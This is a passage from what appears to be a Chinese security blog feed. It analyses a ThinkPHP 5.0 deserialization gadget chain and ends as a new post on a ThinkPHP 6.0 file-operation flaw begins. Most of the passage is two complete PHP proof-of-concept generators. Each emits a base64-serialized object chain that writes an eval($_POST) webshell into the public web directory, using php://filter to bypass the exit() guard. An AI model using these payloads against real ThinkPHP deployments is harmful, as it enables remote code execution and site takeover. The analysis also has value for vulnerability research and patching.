class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Query</span>();  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model = <span class="keyword">new</span> <span class="title class_">Output</span>(); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>\<span class="title class_">Memcached</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">    <span class="comment">//待构造</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"><span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来我们分析Output类的__call方法,我们可以看到其调用了Output类的block方法</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432770.png" alt="image-20240118183443746"></p>
<p>查看block方法,发现其继续调用writeln方法</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432771.png" alt="image-20240118183541410"></p>
<p>继续查看writeln方法,发现其调用了write方法</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432772.png" alt="image-20240118183620984"></p>
<p>继续追踪write方法,发现其调用了<code>$this-&gt;handle</code>的write的方法,而<code>$this-&gt;handle</code>我们是可以控制的</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432773.png" alt="image-20240118183654591"></p>
<p>我们全局搜索有write方法的类发现文件<code>\tp5.0\thinkphp\library\think\session\driver\Memcached.php</code>的Memcached类存在write方法,该方法会调用<code>$this-&gt;handler</code>的set方法,其中<code>$this-&gt;handler</code>我们是可以控制的。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432774.png" alt="image-20240118183822663"></p>
<p>同理我们继续全局搜索含有set方法的类,在File类中我们可以发现set方法,并且可以通过set方法写入文件</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432775.png" alt="image-20240118184212344"></p>
<p>但是通过Memcached类传入的<code>$name</code>我们只能部分控制,而<code>$data</code>却完全不受我们控制。这样写入文件是没有意义的。</p>
<p>为解决这一问题我们关注到第161行的setTagItem函数,我们进入该函数,发现再次调用了set方法写入文件内容,而这一次文件的两个参数我们都可以在一定程度上控制了。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432776.png" alt="image-20240118184855983"></p>
<p>但是这样还不够虽然我们可以控制$value使其含有php代码,但是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$data   = &quot;&lt;?php\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span><br></pre></td></tr></table></figure>
<p>会使得生成的文件没有执行到我们写的后门代码片段就被exit()终止。事实上我们可以通过php伪协议将前面的代码给转换掉。我们先看到看set()获得文件名的方法getCacheKey()。这个方法通过拼接<code>$this-&gt;options['path']</code>生成文件名,而<code>$this-&gt;options['path']</code>是我们可以控制的。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432777.png" alt="image-20240118185945288"></p>
<p>所以在<code>$result = file_put_contents($filename, $data);</code>时我们可以使得file_put_contents调用php://filter处理数据,从而达到绕过exit()的目的。</p>
<p>最终的poc如下(该poc是windows和linux下都通用的)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()]; <span class="comment">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="keyword">new</span> <span class="title class_">Output</span>();  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);     <span class="comment">//调用getError 返回this-&gt;error</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error = <span class="keyword">new</span> <span class="title class_">HasOne</span>();               <span class="comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span> <span class="title class_">extends</span> <span class="title class_">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">db</span>\<span class="title class_">Query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Query</span>();    <span class="comment">//$query指向Query</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $value值，作为call函数引用的第二变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model = <span class="keyword">new</span> <span class="title class_">Output</span>(); <span class="comment">//$this-&gt;model=&gt; think\console\Output;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>\<span class="title class_">Memcached</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle =<span class="keyword">new</span> <span class="title class_">Memcached</span>(); <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">File</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">File</span>(); <span class="comment">//$handle-&gt;think\cache\driver\File</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span>=<span class="title class_">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将会在public目录生成a.php12ac95f1498ce51d2d96a249c09c1998.php其中内容为</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432778.png" alt="image-20240118194424571"></p>
<h2 id="另一种思路">另一种思路:</h2>
<p>还有另外一种思路绕过File::set()的exit()死亡杂糅</p>
<p>在处理文件<code>\tp5.0\thinkphp\library\think\session\driver\Memcached.php</code>的Memcached类的write方法时我们不直接使得<code>$this-&gt;handler</code>指向File类,我们使其指向文件<code>\tp5.0\thinkphp\library\think\cache\driver\Memcache.php</code>的Memcached类的set方法。</p>
<p>在这个set方法中我们可以同样可以看到<code>$this-&gt;handler-&gt;set</code>这时我们将<code>$this-&gt;handler</code>指向$File</p>
<p>换句话说:我们通过Memcached类的set方法作为中转,绕一下调用File类的set方法。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432779.png" alt="image-20240118191151325"></p>
<p>同样的当我们第一次调用Memcached::set时无法控制$value的值,但是任然存在setTagItem()方法被调用。</p>
<p>通过setTagItem我们可以使得第二次调用Memcached::set,$value受我们控制。</p>
<p>所以另外一种windows和linux平台都通用的poc如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()]; <span class="comment">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="keyword">new</span> <span class="title class_">Output</span>();  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);     <span class="comment">//调用getError 返回this-&gt;error</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error = <span class="keyword">new</span> <span class="title class_">HasOne</span>();               <span class="comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span> <span class="title class_">extends</span> <span class="title class_">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">db</span>\<span class="title class_">Query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Query</span>();    <span class="comment">//$query指向Query</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $value值，作为call函数引用的第二变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model = <span class="keyword">new</span> <span class="title class_">Output</span>(); <span class="comment">//$this-&gt;model=&gt; think\console\Output;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>\<span class="title class_">Memcached</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle =<span class="keyword">new</span> <span class="title class_">Memcached</span>(); <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> \think\cache\driver\<span class="title function_ invoke__">Memcached</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">File</span>(); </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag =<span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]=<span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g&quot;</span>;<span class="comment">//这里写shell的base64形式</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span>=<span class="title class_">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.base64-decode/resource=&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">	<span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将会在public目录生成a5c52af8656ce679eb29e3449834f23c.php其中内容为</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432780.png" alt="image-20240118194314277"></p>
<h2 id="漏洞总结">漏洞总结:</h2>
<p>对应两个poc的反序列化链</p>
<p>反序列化链1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">起点:任意反序列化点</span><br><span class="line">--&gt;Windows::__destruct</span><br><span class="line">--&gt;Windows::removeFiles</span><br><span class="line">--&gt;file_exists(将类当作字符串触发__toString)</span><br><span class="line">--&gt;Pivot::__toString(方法继承于Model类,和下面的toJson和toArray一样)</span><br><span class="line">--&gt;Pivot::toJson--&gt;Pivot::toArray</span><br><span class="line">通过一系列手段使得$value成为Output类然后调用Output::getAttr(Output类没有getAttr方法触发__call)</span><br><span class="line">--&gt;Output::__call</span><br><span class="line">--&gt;Output::block--&gt;Output::writeln--&gt;Output::write</span><br><span class="line">--&gt;Memcached::write</span><br><span class="line">--&gt;File::set</span><br><span class="line">--&gt;File::setTagItem</span><br><span class="line">--&gt;File::set(绕过死亡杂糅写入文件)</span><br></pre></td></tr></table></figure>
<p>反序列化链2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">起点:任意反序列化点</span><br><span class="line">--&gt;Windows::__destruct</span><br><span class="line">--&gt;Windows::removeFiles</span><br><span class="line">--&gt;file_exists(将类当作字符串触发__toString)</span><br><span class="line">--&gt;Pivot::__toString(方法继承于Model类,和下面的toJson和toArray一样)</span><br><span class="line">--&gt;Pivot::toJson--&gt;Pivot::toArray</span><br><span class="line">通过一系列手段使得$value成为Output类然后调用Output::getAttr(Output类没有getAttr方法触发__call)</span><br><span class="line">--&gt;Output::__call</span><br><span class="line">--&gt;Output::block--&gt;Output::writeln--&gt;Output::write</span><br><span class="line">--&gt;Memcached::write</span><br><span class="line">--&gt;Memcached::set(cache目录下的set)</span><br><span class="line">--&gt;File::set</span><br><span class="line">--&gt;Memcached::set(cache目录下的set)</span><br><span class="line">--&gt;File::set(绕过死亡杂糅写入文件)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>thinkphp框架漏洞</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>thinkphp漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp-v6.0.0-6.0.1任意文件操作漏洞</title>
    <url>/LtmThink/2024/01/24/thinkphp-v6.0.0-6.0.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="漏洞介绍">漏洞介绍:</h2>
<p>2020年1月10日,ThinkPHP团队发布一个补丁更新,修复了一处由不安全的SessionId导致的任意文件操作漏洞.</p>
<ul class="lvl-0">
<li class="lvl-2">
